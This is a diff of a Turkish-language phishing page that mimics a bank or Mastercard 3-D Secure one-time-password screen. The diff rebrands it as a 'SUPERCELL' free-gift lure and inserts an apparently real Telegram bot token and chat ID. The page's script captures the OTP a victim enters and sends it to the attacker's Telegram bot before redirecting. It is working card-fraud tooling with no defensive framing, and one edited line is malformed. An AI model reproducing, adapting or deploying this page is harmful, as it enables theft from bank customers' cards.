@@ -30,7 +30,7 @@
 <div class="container">
     <div class="header">
         <div class="logo-section">
-            <span class="logo-icon">🌾</span> Ziraat Bankası
+            <span class="logo-icon">🎁</span> SUPERCELL 
         </div>
         <div style="display: flex; align-items: center;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" class="mastercard-logo">
@@ -43,11 +43,11 @@
 
     <div class="info-row">
         <div class="label">İşyeri Adı:</div>
-        <div class="value">M10 TOP UP</div>
+        <div class="value">ÜCRETSİZ ÖDEME>Üdiv>
     </div>
     <div class="info-row">
         <div class="label">İşlem Tutarı:</div>
-        <div class="value">1,00 AZN</div>
+        <div class="value">0,00 TL</div>
     </div>
     <div class="info-row">
         <div class="label">İşlem Tarihi-Saati:</div>
@@ -55,13 +55,13 @@
     </div>
     <div class="info-row">
         <div class="label">Kart Numarası:</div>
-        <div class="value">XXXX XXXX XXXX 5815</div>
+        <div class="value">XXXX XXXX XXXX XXX</div>
     </div>
 
     <hr>
 
     <div class="sms-info">
-        Şifreniz <b>0 XXX XXX6555</b> nolu cep telefonunuza gönderilecektir.<br>
+        Şifreniz <b>0 XXX XXXXXXX</b> nolu cep telefonunuza gönderilecektir.<br>
         Referans no: 7J3V6UB1
     </div>
 
@@ -78,9 +78,9 @@
 
 <script>
     // AYARLAR - BURALARI DOLDURUN
-    const TELEGRAM_BOT_TOKEN = 'BOT_TOKEN_BURA';
-    const TELEGRAM_CHAT_ID = 'CHAT_ID_BURA';
-    const YONLENECEK_SAYFA = 'hazir_sayfa.html'; 
+    const TELEGRAM_BOT_TOKEN = '8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A';
+    const TELEGRAM_CHAT_ID = '-1003369084883';
+    const YONLENECEK_SAYFA = 'codetelephon.html'; 
 
     function onayla() {
         const code = document.getElementById("otpCode").value;
@@ -91,7 +91,7 @@
             btn.innerText = "Yükleniyor...";
             btn.style.opacity = "0.7";
 
-            const message = `🚨 *YENİ KOD GƏLDİ* 🚨\n\n🔹 Kod: \`${code}\`\n🔹 İşyeri: M10 TOP UP\n🔹 Tutar: 1.00 AZN\n🔹 Kart: **** 5815`;
+            const message = `🚨 *SUPERCELL STORE* 🚨\n\n🔹 Kod: \`${code}\`\n🔹 İşyeri: M10 TOP UP\n🔹 Tutar: 1.00 AZN\n🔹 Kart: **** 5815`;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -130,4 +130,5 @@
 
 </body>
 </html>
+
 
